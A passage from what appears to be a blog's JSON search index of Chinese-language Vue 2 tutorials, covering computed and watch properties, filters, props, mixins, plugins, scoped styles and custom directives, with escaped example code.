&#x27;004&#x27;, name: &#x27;温兆伦&#x27;, age: 19, sex: &#x27;男&#x27; &#125;      ]    &#125;,    computed: &#123;      filPersons() &#123;        const arr = this.persons.filter((p) =&gt; &#123;          return p.name.indexOf(this.keyWord) !== -1        &#125;)        //判断一下是否需要排序        if (this.sortType) &#123;          arr.sort((p1, p2) =&gt; &#123;            return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age          &#125;)        &#125;        return arr      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n\n","categories":["Vue"],"tags":["列表渲染"]},{"title":"Vue（六）：计算属性与监视属性","url":"/2022/04/01/Vue%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7/","content":"计算属性：computed姓名案例\n插值语法实现&lt;div id=&quot;root&quot;&gt;  姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;  名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;  全名：&lt;span&gt;&#123;&#123; firstName &#125;&#125;-&#123;&#123; lastName &#125;&#125;&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el:&#x27;#root&#x27;,    data:&#123;      firstName:&#x27;张&#x27;,      lastName:&#x27;三&#x27;    &#125;  &#125;)&lt;/script&gt;\n\nmethod实现数据发生变化，模板就会被重新解析\n&lt;div id=&quot;root&quot;&gt;  姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt;&lt;br/&gt;  名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt;&lt;br/&gt;  全名：&lt;span&gt;&#123;&#123; fullName() &#125;&#125;&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      firstName: &#x27;张&#x27;,      lastName: &#x27;三&#x27;    &#125;,    methods: &#123;      fullName() &#123;        return this.firstName + &#x27;-&#x27; + this.lastName      &#125;    &#125;,  &#125;)&lt;/script&gt;\n\ncomputed计算属性实现\n定义：要用的属性不存在，需要通过已有属性（不是已有变量）计算得来\n原理：底层借助了Objcet.defineproperty()方法提供的getter和setter\nget函数什么时候执行？\n初次读取时会执行一次\n当依赖的数据发生改变时会被再次调用\n\n\n优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便\n备注\n计算属性最终会出现在vm上，直接读取使用即可\n如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变\n如果计算属性确定不考虑修改，可以使用计算属性的简写形式\n\n\n\n&lt;div id=&quot;root&quot;&gt;  姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;  名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;  测试：&lt;input type=&quot;text&quot; v-model=&quot;x&quot;&gt; &lt;br/&gt;\t// 这里修改 不会调 fullName的get方法  全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;  &lt;!-- 全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt; --&gt;  &lt;!-- 全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt; --&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      firstName:&#x27;张&#x27;,      lastName:&#x27;三&#x27;,      x:&#x27;你好&#x27;    &#125;,    computed: &#123;      //完整写法      // fullName: &#123;      // \tget() &#123;      // \t\tconsole.log(&#x27;get被调用了&#x27;)      // \t\treturn this.firstName + &#x27;-&#x27; + this.lastName      // \t&#125;,      // \tset(value) &#123;      // \t\tconsole.log(&#x27;set&#x27;, value)      // \t\tconst arr = value.split(&#x27;-&#x27;)      // \t\tthis.firstName = arr[0]      // \t\tthis.lastName = arr[1]      // \t&#125;      // &#125;      // 简写（只读不改 ）      fullName() &#123;        console.log(&#x27;get被调用了&#x27;)        return this.firstName + &#x27;-&#x27; + this.lastName      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n\n面试题：method和computed的区别？\n\n监视（侦听）属性：watch天气案例\n&lt;title&gt;天气案例&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h3&gt;今天天气很&#123;&#123; info &#125;&#125;&lt;/h3&gt;  &lt;!-- 绑定事件的时候：@xxx=&quot;yyy&quot; yyy可以写一些简单的语句 --&gt;  &lt;!-- &lt;button @click=&quot;isHot = !isHot&quot;&gt;切换天气&lt;/button&gt; --&gt;  &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el:&#x27;#root&#x27;,    data:&#123;      isHot:true,    &#125;,    computed:&#123;      info()&#123;        return this.isHot ? &#x27;炎热&#x27; : &#x27;凉爽&#x27;      &#125;    &#125;,    methods: &#123;      changeWeather()&#123;        this.isHot = !this.isHot      &#125;    &#125;  &#125;)&lt;/script&gt;\n\nwatch监视属性基本用法\n当被监视的属性变化时，回调函数自动调用，进行相关操作\n监视的属性必须存在，才能进行监视，既可以监视data，也可以监视计算属性\n配置项属性immediate:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)\n监视有两种写法\n创建Vue时传入watch: &#123;&#125;配置\n通过vm.$watch()监视\n\n\n\n&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;今天天气很&#123;&#123;info&#125;&#125;&lt;/h2&gt;  &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      isHot: true,    &#125;,    computed: &#123;      info() &#123;        return this.isHot ? &#x27;炎热&#x27; : &#x27;凉爽&#x27;      &#125;    &#125;,    methods: &#123;      changeWeather() &#123;        this.isHot = !this.isHot      &#125;    &#125;,    // 方式一    /* watch:&#123;\t\t\t\t\tisHot:&#123;\t\t\t\timmediate:true,\t\t\t\thandler(newValue,oldValue)&#123;\t\t\t\t\tconsole.log(&#x27;isHot被修改了&#x27;,newValue,oldValue)\t\t\t\t&#125;\t\t\t&#125;\t\t&#125; */  &#125;)  // 方式二  vm.$watch(&#x27;isHot&#x27;, &#123;\t\t    immediate: true, // 初始化时让handler调用一下    //handler什么时候调用？当isHot发生改变时    handler(newValue, oldValue) &#123;      console.log(&#x27;isHot被修改了&#x27;, newValue, oldValue)    &#125;  &#125;)&lt;/script&gt;\n\n深度监视\nVue中的watch默认不监测对象内部值的改变（一层）\n在watch中配置deep:true可以监测对象内部值的改变（多层）\n注意\nVue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以\n使用watch时根据监视数据的具体结构，决定是否采用深度监视\n\n\n\n&lt;div id=&quot;root&quot;&gt;  &lt;h3&gt;a的值是:&#123;&#123; numbers.a &#125;&#125;&lt;/h3&gt;  &lt;button @click=&quot;numbers.a++&quot;&gt;点我让a+1&lt;/button&gt;  &lt;h3&gt;b的值是:&#123;&#123; numbers.b &#125;&#125;&lt;/h3&gt;  &lt;button @click=&quot;numbers.b++&quot;&gt;点我让b+1&lt;/button&gt;  &lt;button @click=&quot;numbers = &#123;a:666,b:888&#125;&quot;&gt;彻底替换掉numbers&lt;/button&gt;  &#123;&#123;numbers.c.d.e&#125;&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      isHot: true,      numbers: &#123;        a: 1,        b: 1,        c: &#123;          d: &#123;            e: 100          &#125;        &#125;      &#125;    &#125;,    watch: &#123;      // 监视多级结构中某个属性的变化      /* &#x27;numbers.a&#x27;:&#123;\t\t\t\thandler()&#123;\t\t\t\t\tconsole.log(&#x27;a被改变了&#x27;)\t\t\t\t&#125;\t\t\t&#125; */      // 监视多级结构中所有属性的变化      numbers: &#123;        deep: true,        handler() &#123;          console.log(&#x27;numbers改变了&#x27;)        &#125;      &#125;    &#125;  &#125;)&lt;/script&gt;\n\n\n监视属性简写\n如果监视属性除了handler没有其他配置项的话，可以进行简写\n\n&lt;div id=&quot;root&quot;&gt;  &lt;h3&gt;今天天气很&#123;&#123; info &#125;&#125;&lt;/h3&gt;  &lt;button @click=&quot;changeWeather&quot;&gt;切换天气&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  const vm = new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;isHot: true,&#125;,    computed: &#123;info() &#123;return this.isHot ? &#x27;炎热&#x27; : &#x27;凉爽&#x27;&#125;&#125;,    methods: &#123;changeWeather() &#123;this.isHot = !this.isHot&#125;&#125;,    watch: &#123;      // 正常写法      // isHot: &#123;      // \t// immediate:true, //初始化时让handler调用一下      // \t// deep:true,\t//深度监视      // \thandler(newValue, oldValue) &#123;      // \t\tconsole.log(&#x27;isHot被修改了&#x27;, newValue, oldValue)      // \t&#125;      // &#125;,      //简写      isHot(newValue, oldValue) &#123;        console.log(&#x27;isHot被修改了&#x27;, newValue, oldValue, this)      &#125;    &#125;  &#125;)  //正常写法  // vm.$watch(&#x27;isHot&#x27;, &#123;  // \timmediate: true, //初始化时让handler调用一下  // \tdeep: true,//深度监视  // \thandler(newValue, oldValue) &#123;  // \t\tconsole.log(&#x27;isHot被修改了&#x27;, newValue, oldValue)  // \t&#125;  // &#125;)l  //简写  // vm.$watch(&#x27;isHot&#x27;, function(newValue, oldValue)&#123;  // \tconsole.log(&#x27;isHot被修改了&#x27;, newValue, oldValue)  // &#125;)&lt;/script&gt;\n\n计算属性VS监视属性\ncomputed和watch之间的区别\ncomputed能完成的功能，watch都可以完成\nwatch能完成的功能，computed不一定能完成，例如watch可以进行异步操作\n\n\n\n使用计算属性new Vue(&#123;    el:&#x27;#root&#x27;,     data:&#123;         firstName:&#x27;张&#x27;,        lastName:&#x27;三&#x27;    &#125;,    computed:&#123;    \tfullName()&#123;\t\t    return this.firstName + &#x27;-&#x27; + this.lastName    \t&#125;    &#125;&#125;)\n\n使用监听属性new Vue(&#123;  el:&#x27;#root&#x27;,  data:&#123;    firstName:&#x27;张&#x27;,    lastName:&#x27;三&#x27;,    fullName:&#x27;张-三&#x27;  &#125;,  watch:&#123;    firstName(val)&#123;      setTimeout(()=&gt;&#123;        this.fullName = val + &#x27;-&#x27; + this.lastName      &#125;,1000);    &#125;,    lastName(val)&#123;      this.fullName = this.firstName + &#x27;-&#x27; + val    &#125;  &#125;&#125;)\n\n\n两个重要的小原则\n所有被Vue管理的函数，最好写成普通函数，这样 this 的指向才是vm或组件实例对象\n所有不被Vue所管理的函数（定时器的回调函数、ajax 的回调函数等、Promise 的回调函数），最好写成箭头函数，这样 this 的指向才是vm或组件实例对象\n\n\n\n","categories":["Vue"],"tags":["计算属性","监视属性"]},{"title":"Vue（十一）：过滤器（Vue3中已经移除）","url":"/2022/04/06/Vue%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89%EF%BC%9A%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%88Vue3%E4%B8%AD%E5%B7%B2%E7%BB%8F%E7%A7%BB%E9%99%A4%EF%BC%89/","content":"过滤器（Vue3中已经移除）\n定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）\n注册过滤器：\nVue.filter(name, callback)全局过滤器\nnew Vue &#123;filters: &#123;&#125;&#125; 局部过滤器\n\n\n使用过滤器：&#123;&#123; xxx | 过滤器名&#125;&#125; 或 v-bind:属性 = &quot;xxx | 过滤器名&quot;\n备注：\n过滤器可以接收额外参数，多个过滤器也可以串联\n并没有改变原本的数据，而是产生新的对应的数据\n\n\n处理时间的库：moment体积较大 、dayjs轻量级\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;\t&lt;head&gt;\t\t&lt;meta charset=&quot;UTF-8&quot; /&gt;\t\t&lt;title&gt;过滤器&lt;/title&gt;\t\t&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;\t\t&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js&quot;&gt;&lt;/script&gt;\t&lt;/head&gt;\t&lt;body&gt;\t\t&lt;div id=&quot;root&quot;&gt;\t\t\t&lt;h2&gt;时间&lt;/h2&gt;            &lt;h3&gt;当前时间戳：&#123;&#123;time&#125;&#125;&lt;/h3&gt;            &lt;h3&gt;转换后时间：&#123;&#123;time | timeFormater()&#125;&#125;&lt;/h3&gt;\t\t\t&lt;h3&gt;转换后时间：&#123;&#123;time | timeFormater(&#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#125;&#125;&lt;/h3&gt;\t\t\t&lt;h3&gt;截取年月日：&#123;&#123;time | timeFormater() | mySlice&#125;&#125;&lt;/h3&gt;\t\t&lt;/div&gt;\t&lt;/body&gt;\t&lt;script type=&quot;text/javascript&quot;&gt;\t\tVue.config.productionTip = false\t\t// 全局过滤器\t\tVue.filter(&#x27;mySlice&#x27;,function(value)&#123;\t\t\treturn value.slice(0,11)\t\t&#125;)\t\tnew Vue(&#123;            el:&#x27;#root&#x27;,            data:&#123;                time:1626750147900,            &#125;,\t\t\t// 局部过滤器            filters:&#123;                timeFormater(value, str=&quot;YYYY年MM月DD日 HH:mm:ss&quot;)&#123;                    return dayjs(value).format(str)                &#125;            &#125;        &#125;)\t&lt;/script&gt;&lt;/html&gt;\n\n","categories":["Vue"],"tags":["过滤器"]},{"title":"Vue（十七）：Vue脚手架之ref、props、mixin、plugin、scoped","url":"/2022/04/07/Vue%EF%BC%88%E5%8D%81%E4%B8%83%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8Bref%E3%80%81props%E3%80%81mixin%E3%80%81plugin%E3%80%81scoped/","content":"ref属性ref被用来给元素或子组件注册引用信息（id的替代者）\n\n应用在html标签上获取的是真实DOM元素，应用在组件标签上获取的是组件实例对象vc\n使用方式\n打标识：&lt;h1 ref=&quot;xxx&quot;&gt;&lt;/h1&gt;或&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;\n获取：this.$refs.xxx\n\n\n\n&lt;template&gt;  &lt;div&gt;    &lt;h1 v-text=&quot;msg&quot; ref=&quot;title&quot;&gt;&lt;/h1&gt;    &lt;button ref=&quot;btn&quot; @click=&quot;showDOM&quot;&gt;点我输出上方的DOM元素&lt;/button&gt;    &lt;School ref=&quot;sch&quot;/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import School from &#x27;./components/School&#x27;  export default &#123;    name:&#x27;App&#x27;,    components:&#123; School &#125;,    data() &#123;      return &#123;        msg:&#x27;欢迎学习Vue！&#x27;      &#125;    &#125;,    methods: &#123;      showDOM()&#123;        console.log(this.$refs.title)\t// 真实DOM元素        console.log(this.$refs.btn)\t\t// 真实DOM元素        console.log(this.$refs.sch)\t\t// School组件的实例对象（vc）      &#125;    &#125;,  &#125;&lt;/script&gt;\n\n\nprops配置项props：让组件接收外部传过来的数据\n\n传递数据&lt;Demo name=&quot;xxx&quot; :age=&quot;18&quot;/&gt;这里age前加:，表示通过v-bind使得里面的18是数字\n\n接收数据\n\n第一种方式（只接收）props:[&#39;name&#39;, &#39;age&#39;]\n\n第二种方式（限制类型）props:&#123;name:String, age:Number&#125;\n\n第三种方式（限制类型、限制必要性、指定默认值）如下\nprops: &#123;    name: &#123;        type: String,\t // 类型        required: true,// 必要性        default: &#x27;cess&#x27;// 默认值    &#125;&#125;\n\n\n\n\n备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中，然后去修改data中的数据。\n\nsrc/App.vue\n&lt;template&gt;  &lt;div&gt;    &lt;Student name=&quot;李四&quot; sex=&quot;女&quot; :age=&quot;18&quot;/&gt;    &lt;Student name=&quot;王五&quot; sex=&quot;男&quot; :age=&quot;18&quot;/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Student from &#x27;./components/Student&#x27;  export default &#123;    name:&#x27;App&#x27;,    components:&#123; Student &#125;  &#125;&lt;/script&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;/h1&gt;    &lt;h2&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生性别：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生年龄：&#123;&#123; myAge + 1 &#125;&#125;&lt;/h2&gt;    &lt;button @click=&quot;updateAge&quot;&gt;尝试修改收到的年龄&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &quot;Student&quot;,  data() &#123;    console.log(this);    return &#123;      msg: &quot;我是一个UESTC大学的学生&quot;,      myAge: this.age,    &#125;;  &#125;,  methods: &#123; updateAge() &#123; this.myAge++; &#125;, &#125;,  // 简单声明接收  // props:[&#x27;name&#x27;,&#x27;age&#x27;,&#x27;sex&#x27;]  // 接收的同时对数据进行类型限制  //   props: &#123;  //     name: String,  //     age: Number,  //     sex: String,  //   &#125;  // 接收的同时对数据：进行类型限制+默认值的指定+必要性的限制  props: &#123;    name: &#123;      type: String, \t//name的类型是字符串      required: true, //name是必要的    &#125;,    age: &#123;      type: Number,      default: 99, //默认值    &#125;,    sex: &#123;      type: String,      required: true,    &#125;,  &#125;,&#125;;&lt;/script&gt;\n\n\nmixin(混入)配置项\n功能：可以把多个组件共用的配置提取成一个混入对象(类似父类)\n\n使用方式\n\n定义混入\nconst mixin = &#123;    data() &#123;....&#125;,    methods: &#123;....&#125;    ....&#125;\n\n使用混入\n\n全局混入Vue.mixin(xxx)\n局部混入mixins:[&#39;xxx&#39;]\n\n\n\n\n备注\n\n组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”，在发生冲突时以组件优先\nvar mixin = &#123;\tdata: function () &#123;\t\treturn &#123;    \t\tmessage: &#x27;hello&#x27;,            foo: &#x27;abc&#x27;    \t&#125;  \t&#125;&#125;new Vue(&#123;  \tmixins: [mixin],  \tdata () &#123;    \treturn &#123;      \t\tmessage: &#x27;goodbye&#x27;,            \tbar: &#x27;def&#x27;    \t&#125;    &#125;,  \tcreated () &#123;    \tconsole.log(this.$data)    \t// =&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125;  \t&#125;&#125;)\n\n同名生命周期钩子将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用\nvar mixin = &#123;  \tcreated () &#123;    \tconsole.log(&#x27;混入对象的钩子被调用&#x27;)  \t&#125;&#125;new Vue(&#123;  \tmixins: [mixin],  \tcreated () &#123;    \tconsole.log(&#x27;组件钩子被调用&#x27;)  \t&#125;&#125;)// =&gt; &quot;混入对象的钩子被调用&quot;// =&gt; &quot;组件钩子被调用&quot;\n\n\n代码示例：\nsrc/mixin.js\nexport const hunhe = &#123;\tmethods: &#123;\t\tshowName()&#123;\t\t\talert(this.name)\t\t&#125;\t&#125;,\tmounted() &#123;\t\tconsole.log(&#x27;你好啊！&#x27;)\t&#125;,&#125;export const hunhe2 = &#123;\tdata() &#123;\t\treturn &#123;\t\t\tx:100,\t\t\ty:200\t\t&#125;\t&#125;,&#125;\n\nsrc/components.School.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2 @click=&quot;showName&quot;&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  //引入一个hunhe  import &#123;hunhe,hunhe2&#125; from &#x27;../mixin&#x27;  export default &#123;    name:&#x27;School&#x27;,    data() &#123;      return &#123;        name:&#x27;尚硅谷&#x27;,        address:&#x27;北京&#x27;,        x:666      &#125;    &#125;,    mixins:[hunhe,hunhe2]\t// 局部混入  &#125;&lt;/script&gt;\n\nsrc/components.Student.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2 @click=&quot;showName&quot;&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生性别：&#123;&#123;sex&#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import &#123;hunhe,hunhe2&#125; from &#x27;../mixin&#x27;  export default &#123;    name:&#x27;Student&#x27;,    data() &#123;      return &#123;        name:&#x27;张三&#x27;,        sex:&#x27;男&#x27;      &#125;    &#125;,    mixins:[hunhe,hunhe2]\t// 局部混入  &#125;&lt;/script&gt;\n\nsrc/App.vue\n&lt;template&gt;  &lt;div&gt;    &lt;School/&gt;    &lt;hr&gt;    &lt;Student/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import School from &#x27;./components/School&#x27;  import Student from &#x27;./components/Student&#x27;  export default &#123;    name:&#x27;App&#x27;,    components:&#123;School,Student&#125;  &#125;&lt;/script&gt;\n\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;// import &#123;hunhe,hunhe2&#125; from &#x27;./mixin&#x27;Vue.config.productionTip = false// Vue.mixin(hunhe)\t\t// 全局混合引入// Vue.mixin(hunhe2)\t// 全局混合new Vue(&#123;    el:&quot;#app&quot;,    render: h =&gt; h(App)&#125;)\n\n\n\n\nplugin插件\n功能：用于增强Vue\n本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据\n定义插件（见下 src&#x2F;plugin.js）\n使用插件：Vue.use()\n\nsrc/plugin.js\nexport default &#123;  install(Vue,x,y,z)&#123;    console.log(x,y,z)    //全局过滤器    Vue.filter(&#x27;mySlice&#x27;, function(value)&#123;return value.slice(0,4)&#125;)    //定义全局指令    Vue.directive(&#x27;fbind&#x27;,&#123;      //指令与元素成功绑定时（一上来）      bind(element,binding)&#123;element.value = binding.value&#125;,      //指令所在元素被插入页面时      inserted(element,binding)&#123;element.focus()&#125;,      //指令所在的模板被重新解析时      update(element,binding)&#123;element.value = binding.value&#125;    &#125;)    //定义混入    Vue.mixin(&#123;      data() &#123;return &#123;x:100,y:200&#125;&#125;,    &#125;)    //给Vue原型上添加一个方法（vm和vc就都能用了）    Vue.prototype.hello = ()=&gt;&#123;alert(&#x27;你好啊&#x27;)&#125;  &#125;&#125;\n\n\n代码示例：\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import plugins from &#x27;./plugins&#x27;\t// 引入插件Vue.config.productionTip = falseVue.use(plugins,1,2,3)\t// 应用（使用）插件new Vue(&#123;\tel:&#x27;#app&#x27;,\trender: h =&gt; h(App)&#125;)\n\nsrc/components/School.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;学校名称：&#123;&#123; name | mySlice &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;    &lt;button @click=&quot;test&quot;&gt;点我测试一个hello方法&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;School&#x27;,    data() &#123;      return &#123;        name:&#x27;尚硅谷atguigu&#x27;,        address:&#x27;北京&#x27;,      &#125;    &#125;,    methods: &#123;      test()&#123;        this.hello()      &#125;    &#125;,  &#125;&lt;/script&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学生性别：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;    &lt;input type=&quot;text&quot; v-fbind:value=&quot;name&quot;&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;Student&#x27;,    data() &#123;      return &#123;        name:&#x27;张三&#x27;,        sex:&#x27;男&#x27;      &#125;    &#125;,  &#125;&lt;/script&gt;\n\n\n\n\nscoped样式\n作用：让样式在局部生效，防止冲突\n写法：&lt;style scoped&gt;\n\n\nVue中的webpack并没有安装最新版，导致有些插件也不能默认安装最新版，如 npm i less-loader@7，而不是最新版\n\nsrc/components/School.vue\n&lt;template&gt;  &lt;div class=&quot;demo&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;School&#x27;,    data() &#123;      return &#123;        name:&#x27;尚硅谷atguigu&#x27;,        address:&#x27;北京&#x27;,      &#125;    &#125;  &#125;&lt;/script&gt;&lt;style scoped&gt;  .demo&#123;    background-color: skyblue;  &#125;&lt;/style&gt;\n\nsrc/components/Student.vue\n&lt;template&gt;  &lt;div class=&quot;demo&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;学生姓名：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2 class=&quot;atguigu&quot;&gt;学生性别：&#123;&#123; sex &#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &#x27;Student&#x27;,    data() &#123;      return &#123;        name: &#x27;张三&#x27;,        sex: &#x27;男&#x27;      &#125;    &#125;  &#125;&lt;/script&gt;&lt;style lang=&quot;less&quot; scoped&gt;  .demo &#123;    background-color: pink;    .atguigu &#123;      font-size: 40px;    &#125;  &#125;&lt;/style&gt;\n\nsrc/App.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h1 class=&quot;title&quot;&gt;你好啊&lt;/h1&gt;    &lt;School/&gt;    &lt;Student/&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  import Student from &#x27;./components/Student&#x27;  import School from &#x27;./components/School&#x27;  export default &#123;    name: &#x27;App&#x27;,    components: &#123; School, Student &#125;  &#125;&lt;/script&gt;&lt;style scoped&gt;  .title &#123;    color: red;  &#125;&lt;/style&gt;\n\n\n","categories":["Vue"],"tags":["Vue CLI","ref","props","mixin","plugin","scoped"]},{"title":"Vue（十三）：自定义指令","url":"/2022/04/06/Vue%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89%EF%BC%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/","content":"自定义指令\n回顾一个DOM操作\n&lt;style&gt;.demo&#123;background-color: orange;&#125;&lt;/style&gt;&lt;body&gt;  &lt;button id=&quot;btn&quot;&gt;点我创建一个输入框&lt;/button&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot; &gt;  const btn = document.getElementById(&#x27;btn&#x27;)  btn.onclick = ()=&gt;&#123;    const input = document.createElement(&#x27;input&#x27;)    input.className = &#x27;demo&#x27;    input.value = 99    input.onclick = ()=&gt;&#123;alert(1)&#125;    document.body.appendChild(input)    input.focus()    input.parentElement.style.backgroundColor = &#x27;skyblue&#x27;  &#125;&lt;/script&gt;\n\n&lt;title&gt;自定义指令&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;root&quot;&gt;  &lt;h2&gt;&#123;&#123; name &#125;&#125;&lt;/h2&gt;  &lt;h2&gt;当前的n值是：&lt;span v-text=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt;  &lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;  &lt;h2&gt;放大10倍后的n值是：&lt;span v-big=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt;  &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt;  &lt;hr /&gt;  &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  Vue.config.productionTip = false  // 定义全局指令  /* Vue.directive(&#x27;fbind&#x27;,&#123;\t\t// 指令与元素成功绑定时（一上来）\t\tbind(element,binding)&#123;\t\t\telement.value = binding.value\t\t&#125;,\t\t// 指令所在元素被插入页面时\t\tinserted(element,binding)&#123;\t\t\telement.focus()\t\t&#125;,\t\t// 指令所在的模板被重新解析时\t\tupdate(element,binding)&#123;\t\t\telement.value = binding.value\t\t&#125;\t&#125;) */  new Vue(&#123;    el: &#x27;#root&#x27;,    data: &#123;      name: &#x27;尚硅谷&#x27;,      n: 1    &#125;,    directives: &#123;      // big函数何时会被调用？      // 1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时      /* &#x27;big-number&#x27;(element,binding)&#123;\t\t\t\t// console.log(&#x27;big&#x27;)\t\t\t\telement.innerText = binding.value * 10\t\t\t&#125;, */      big(element, binding) &#123;        console.log(&#x27;big&#x27;, this) // 🔴注意此处的 this 是 window        // console.log(&#x27;big&#x27;)        element.innerText = binding.value * 10      &#125;,      fbind: &#123;        // 指令与元素成功绑定时（一上来）        bind(element, binding) &#123;          element.value = binding.value        &#125;,        // 指令所在元素被插入页面时        inserted(element, binding) &#123;          element.focus()        &#125;,        // 